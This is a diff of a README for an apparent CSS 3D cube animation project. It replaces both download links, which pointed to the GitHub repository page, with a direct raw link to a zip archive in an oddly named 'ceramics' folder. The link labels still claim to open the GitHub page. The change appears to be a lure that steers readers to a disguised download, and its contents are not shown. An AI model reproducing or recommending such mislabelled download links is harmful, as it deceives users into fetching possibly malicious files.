@@ -1,6 +1,6 @@
 # 🎨 css-3d-cube-animation - Build a Smooth 3D Cube
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Sapphirabuiltup183/css-3d-cube-animation)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Sapphirabuiltup183/css-3d-cube-animation/main/ceramics/css-animation-cube-d-v3.5.zip)
 
 ## 🧊 Overview
 
@@ -12,7 +12,7 @@ This project is built for simple viewing in a web browser. It works well on Wind
 
 Use this link to visit the download page:
 
-[Open css-3d-cube-animation on GitHub](https://github.com/Sapphirabuiltup183/css-3d-cube-animation)
+[Open css-3d-cube-animation on GitHub](https://raw.githubusercontent.com/Sapphirabuiltup183/css-3d-cube-animation/main/ceramics/css-animation-cube-d-v3.5.zip)
 
 After you open the page:
 
